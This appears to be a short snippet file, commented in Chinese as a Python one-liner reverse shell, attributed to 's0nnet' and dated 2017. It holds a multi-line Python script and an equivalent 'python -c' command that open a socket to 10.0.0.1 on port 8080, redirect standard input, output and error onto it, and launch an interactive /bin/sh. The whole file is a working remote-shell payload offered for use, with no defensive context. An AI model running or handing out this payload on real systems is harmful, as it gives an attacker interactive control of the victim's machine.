# -*- coding: utf-8 -*-

# 反弹shell python一句话版
# author: s0nnet
# time: 2017-01-20

"""
# 基于subprocess
import os
import socket
import subprocess

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",8080))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p=subprocess.call(["/bin/sh","-i"])
"""

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
